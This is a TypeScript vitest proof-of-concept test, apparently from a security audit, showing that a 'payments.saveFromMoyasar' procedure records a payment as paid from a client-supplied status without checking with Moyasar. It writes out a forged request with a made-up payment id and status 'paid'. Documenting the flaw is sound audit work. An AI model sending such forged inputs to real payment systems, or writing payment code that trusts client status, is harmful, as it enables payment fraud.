// PoC for C5 -- payments.saveFromMoyasar trusts client-supplied status with no
// server-side verification against Moyasar (server/routers.ts:1489-1515).
//
// Mocks server/db.ts and server/_core/moyasar.ts (same style as the repo's own
// server/finance.test.ts), so this test needs only `vitest` installed -- no live
// database, no real Moyasar API key.
//
// Run with: npx vitest run poc/c5_payment_spoof.poc.test.ts
import { describe, it, expect, vi } from "vitest";

const createdPayments: any[] = [];

vi.mock("../server/db", async () => ({
  getPaymentByMoyasarId: vi.fn(async () => undefined), // no existing payment -> proceeds
  getInvoiceById: vi.fn(async (id: number) => ({
    id,
    parentId: 7, // must match the caller's user id for the ownership check to pass
    total: "1200.00",
    status: "pending",
    invoiceNumber: "INV-2026-0007",
  })),
  createPayment: vi.fn(async (data: any) => {
    createdPayments.push(data);
    return { id: 999, ...data };
  }),
}));

vi.mock("../server/_core/moyasar", async () => ({
  isMoyasarConfigured: vi.fn(() => true),
  // This is the function that would need to be called to legitimately confirm a
  // payment. The test asserts it is NEVER invoked by saveFromMoyasar.
  fetchMoyasarPayment: vi.fn(async () => ({ id: "real-moyasar-id", status: "failed", amount: 0 })),
}));

function parentContext(userId: number) {
  return {
    user: { id: userId, openId: `parent-${userId}`, name: "Parent", role: "parent", isActive: true, createdAt: new Date() },
    req: { headers: {} } as any,
    res: { clearCookie: () => {} } as any,
  };
}

describe("C5 -- payment status spoofing via payments.saveFromMoyasar (PoC)", () => {
  it("creates a 'paid' payment record from client-supplied status, with zero Moyasar verification calls", async () => {
    const { appRouter } = await import("../server/routers");
    const moyasar = await import("../server/_core/moyasar") as any;
    const caller = appRouter.createCaller(parentContext(7));

    // Attacker-controlled input: a fabricated moyasarPaymentId and status:'paid'.
    // In real life, Moyasar's own API (mocked above) says this payment FAILED
    // (status: 'failed', amount: 0) -- but saveFromMoyasar never asks Moyasar.
    const result = await caller.payments.saveFromMoyasar({
      moyasarPaymentId: "fabricated-id-attacker-made-up",
      invoiceId: 55,
      amount: 1200,
      method: "mada",
      status: "paid", // <-- pure client input, per server/routers.ts:1494 (z.string())
    });

    // PROOF 1: Moyasar's real verification endpoint was NEVER called. Contrast with
    // the sibling `payments.verify` procedure (server/routers.ts:1516-1537), which
    // DOES call fetchMoyasarPayment before trusting any status.
    expect(moyasar.fetchMoyasarPayment).not.toHaveBeenCalled();

    // PROOF 2: a payment row was persisted with status 'paid', derived directly and
    // exclusively from the attacker-supplied `status` field.
    expect(createdPayments).toHaveLength(1);
    expect(createdPayments[0].status).toBe("paid");
    expect(result.status).toBe("created");
  });
});
